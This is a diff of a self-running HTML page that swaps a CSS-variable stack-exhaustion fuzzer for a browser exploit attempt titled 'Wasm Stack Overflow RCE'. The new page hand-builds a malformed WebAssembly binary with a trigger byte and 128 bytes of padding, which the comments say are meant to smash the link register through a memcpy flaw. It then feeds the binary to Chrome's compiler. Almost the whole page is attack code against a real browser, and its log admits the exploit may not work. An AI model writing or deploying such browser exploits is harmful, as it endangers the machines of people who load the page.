@@ -1,38 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CSS Stack Clash Fuzzer</title>
-    <style id="fuzzStyle"></style>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Wasm Stack Overflow RCE</title>
 </head>
-<body>
-    <div id="target">Triggering CSS Engine...</div>
+<body style="background:#000; color:#0f0; font-family:monospace; font-size: 14px; padding: 10px;">
+    <h3>Injecting Wasm Bytecode...</h3>
+    <div id="log">Waiting...<br></div>
 
     <script>
-        function triggerCSSClash() {
-            let styleEl = document.getElementById('fuzzStyle');
-            let cssText = ":root { \n";
+        const logEl = document.getElementById('log');
+        function log(msg) { logEl.innerHTML += msg + "<br>"; }
+
+        async function triggerRCE() {
+            log("[*] Constructing malicious Wasm binary...");
+
+            // 1. Wasm Magic Number (\0asm) and Version (1)
+            // This tricks Chrome into passing the buffer to the Wasm parser
+            const magicAndVersion = [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00];
+
+            // 2. The Exploit Payload
+            let exploitData = [];
             
-            // 1. Build an insanely deep, interdependent CSS variable tree
-            // --var1 relies on --var2, which relies on --var3...
-            let depth = 8000; 
-            for (let i = 0; i < depth; i++) {
-                cssText += `--v${i}: var(--v${i+1}, 1px);\n`;
+            // We pad with some dummy section headers (Type section, Function section, etc.)
+            // just in case the parser checks for a valid structure before hitting our function.
+            // Custom Section (0x00) -> Size -> Name Length -> Name -> Payload
+            exploitData.push(0x00); // Section ID: Custom
+            exploitData.push(0x85); // Section Size (133 bytes)
+            exploitData.push(0x01); // Name Length (1 byte)
+            exploitData.push(0x78); // Name: "x"
+
+            // THE TRIGGER: 0x6a
+            // This is the byte that Ghidra showed routes to the memcpy vulnerability
+            exploitData.push(0x6a); 
+
+            // THE OVERFLOW: 128 bytes of 0x41 ('A')
+            // This will overflow the 8-byte local_f0 pointer and smash the Link Register (LR)
+            for (let i = 0; i < 128; i++) {
+                exploitData.push(0x41);
             }
-            cssText += `--v${depth}: 10px; \n}\n`;
 
-            // 2. Force the CSS Parser (css_parser_impl.cc) to parse it
-            styleEl.innerHTML = cssText;
+            // 3. Combine into a final buffer
+            const wasmBuffer = new Uint8Array([...magicAndVersion, ...exploitData]);
 
-            // 3. Force the Style Resolver (style_resolver.cc) to calculate it
-            // We apply it to a deeply nested calc() to maximize stack frame usage
-            let target = document.getElementById('target');
-            target.style.width = "calc(var(--v0) * 2)";
-            
-            // Force layout calculation
-            let force = target.offsetWidth; 
+            log("[*] Buffer size: " + wasmBuffer.byteLength + " bytes");
+            log("[*] Handing buffer to Chrome's V8/Liftoff Compiler...");
+
+            try {
+                // 4. Force the native engine to parse the byte array
+                // We use WebAssembly.compile instead of instantiate to hit the parser immediately
+                await WebAssembly.compile(wasmBuffer);
+                
+                log("<span style='color:orange;'>[-] Compilation finished without crashing.</span>");
+                log("[-] The parser might require a slightly more valid Wasm structure to reach the vulnerable function.");
+            } catch (e) {
+                // If the parser rejects it gracefully (no crash)
+                log("<span style='color:red;'>[!] Parser Rejected Payload:</span> " + e.message);
+            }
         }
 
-        setTimeout(triggerCSSClash, 500);
+        // Fire after a short delay
+        setTimeout(triggerRCE, 1000);
     </script>
 </body>
 </html>
